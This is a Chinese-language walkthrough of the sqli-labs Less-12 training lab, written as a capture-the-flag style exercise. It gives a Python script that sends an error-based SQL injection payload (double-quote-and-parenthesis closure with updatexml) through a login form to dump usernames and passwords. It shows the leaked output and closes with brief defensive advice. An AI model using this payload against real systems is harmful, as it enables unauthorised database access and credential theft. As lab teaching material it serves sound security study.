## 题目: Sqli-labs Less-12

## 题目描述
本关同样是一个登录框，页面标题为 `Error Based- Double quotes- String`。与 Less-11 非常相似，但闭合方式变为了**双引号加括号 `")`**。

## 解题思路
由于是 POST 请求，我们需要使用 Python 的 `requests` 库发送数据。
核心思路与 Less-11 一致，利用 `updatexml` 函数报错注入。只需将 URL 改为 Less-12，并将 Payload 的闭合符从单引号 `'` 改为 `")` 即可。

## 解题步骤
**1. 构造双引号闭合 Payload**
输入 `admin")`，尝试闭合后端语句。随后接上 `updatexml` 报错语句，并用 `#` 注释掉后面的密码校验。

**实战 Payload 核心代码**：

```python
import requests

url = "http://127.0.0.1/sqli-labs/Less-12/"

# 核心修改：把 admin' 改成 admin")
payload = "admin\") and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) #"

data = {
    'uname': payload,
    'passwd': '1', 
    'submit': 'Submit'
}

print("正在执行 Less-12 双引号报错注入...")
r = requests.post(url, data=data)

# 查找包含 XPATH 报错信息的行
print("\n============== 寻找报错信息 ==============")
for line in r.text.split('\n'):
    if "XPATH" in line or "error" in line.lower():
        print(line.strip())
```

**2. 运行结果**
成功爆出数据库中的账号密码：
```text
XPATH syntax error: '~Dumb:Dumb,Angelina:I-kill-you,D'
```

## 知识点总结
* 闭合符的试探：Less-11 是 '，Less-12 是 ")。盲猜是行不通的，必须通过观察报错信息（如 near '...'）来精准判断。
* 脚本复用：面对同类漏洞，修改核心 Payload 字符和 URL 即可快速完成脚本复用，极大提高效率。
* 防御策略：使用 PDO 预编译；在代码层面严格校验输入格式；关闭生产环境详细报错。
